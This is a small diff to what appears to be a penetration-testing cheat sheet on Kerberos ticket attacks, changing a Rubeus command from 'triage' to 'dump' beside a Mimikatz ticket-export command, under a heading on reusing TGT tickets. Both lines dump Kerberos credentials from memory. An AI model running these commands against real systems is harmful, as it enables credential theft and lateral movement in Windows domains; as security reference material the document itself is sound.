@@ -543,7 +543,7 @@ Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 ```
 
 ```
-.\Rubeus.exe triage /luid:<LUID> /service:<SERVICE>
+.\Rubeus.exe dump /luid:<LUID> /service:<SERVICE>
 ```
 
 #### Reuse the TGT ticket
